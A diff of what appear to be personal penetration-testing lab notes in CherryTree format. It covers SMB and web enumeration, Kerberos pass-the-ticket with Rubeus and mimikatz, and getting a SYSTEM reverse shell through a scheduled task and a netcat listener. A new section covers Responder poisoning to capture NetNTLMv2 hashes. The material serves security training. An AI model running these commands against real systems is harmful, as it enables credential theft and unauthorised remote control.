@@ -1268,7 +1268,7 @@ _____________________________________
         <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. | tee output.log</codebox>
         <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
-      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1688939720">
+      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1689017974">
         <rich_text scale="h1">Nmap</rich_text>
         <rich_text>
 
@@ -1366,13 +1366,13 @@ Also check
         <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.11.1.</codebox>
         <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.11.1.</codebox>
         <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.11.1.</codebox>
-        <codebox char_offset="355" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.11.1</codebox>
+        <codebox char_offset="355" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.11.1.</codebox>
         <codebox char_offset="376" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
 Password: &lt;password&gt;</codebox>
         <codebox char_offset="410" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
         <codebox char_offset="435" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1688334012">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1689198163">
         <rich_text>
 
 
@@ -1785,11 +1785,31 @@ runas /netonly /user:domain.local\user cmd
           <codebox char_offset="1630" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
           <codebox char_offset="1640" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
           <codebox char_offset="1685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
-          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943866">
-            <rich_text>First, let's restart out Netcat listener.
-&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.
+          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
+            <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text scale="h2">
+&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</rich_text>
+            <rich_text>
+
 &#13;</rich_text>
-            <rich_text family="monospace">c:\windows\system32\inetsrv&gt;powershell&#13;
+            <rich_text justification="left"></rich_text>
+            <rich_text family="monospace">&#13;
+</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text scale="h2">&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</rich_text>
+            <rich_text>
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text family="monospace">&#13;
+</rich_text>
+            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
+listening on [any] 445 ...&#13;
+</codebox>
+            <codebox char_offset="172" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">c:\windows\system32\inetsrv&gt;powershell&#13;
 powershell&#13;
 Windows PowerShell &#13;
 Copyright (C) Microsoft Corporation. All rights reserved.&#13;
@@ -1810,11 +1830,8 @@ PS C:\windows\system32\inetsrv&gt;&#13;
 PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
 Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
 SUCCESS: Attempted to run the scheduled task "shell".&#13;
-PS C:\windows\system32\inetsrv&gt;&#13;
-</rich_text>
-            <rich_text>&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.
-&#13;</rich_text>
-            <rich_text family="monospace">kali@kali:~$ nc -lvp 445&#13;
+PS C:\windows\system32\inetsrv&gt;</codebox>
+            <codebox char_offset="290" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ nc -lvp 445&#13;
 listening on [any] 445 ...&#13;
 192.168.120.108: inverse host lookup failed: Unknown host&#13;
 connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
@@ -1823,11 +1840,7 @@ Microsoft Windows [Version 10.0.17763.1554]&#13;
 &#13;
 C:\Windows\system32&gt;whoami&#13;
 whoami&#13;
-nt authority\system&#13;
-</rich_text>
-            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
-listening on [any] 445 ...&#13;
-</codebox>
+nt authority\system</codebox>
           </node>
         </node>
         <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1688935332">
@@ -2178,6 +2191,53 @@ _________________________________________________________________
 &#13;
 &#13;
 </rich_text>
+        </node>
+        <node name="Responder" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689197133" ts_lastsave="1689283651">
+          <rich_text scale="h1">
+LLMNR/NBT-NS/mDNS Poisoner
+
+
+</rich_text>
+          <rich_text scale="h2">Basic Usage:</rich_text>
+          <rich_text>
+
+Run:
+
+sudo responder -I tun0
+or 
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+or
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+And then made victim perform actions (send queries via ssrf) to posion
+When a client tries to resolve a name not in the DNS, Responder will poison the LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and spoof SMB Request in order to grab NetNTLMv2 hash.
+
+Reference:
+</rich_text>
+          <rich_text link="webs https://juggernaut-sec.com/llmnr-poisoning-responder/">https://juggernaut-sec.com/llmnr-poisoning-responder/</rich_text>
+          <codebox char_offset="79" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wv</codebox>
+          <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wvfr</codebox>
+        </node>
+        <node name="Remote Shells for Windows" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689198163" ts_lastsave="1689198334">
+          <rich_text>
+
+</rich_text>
+          <rich_text link="node 86">psexec - Passthe HAsh</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
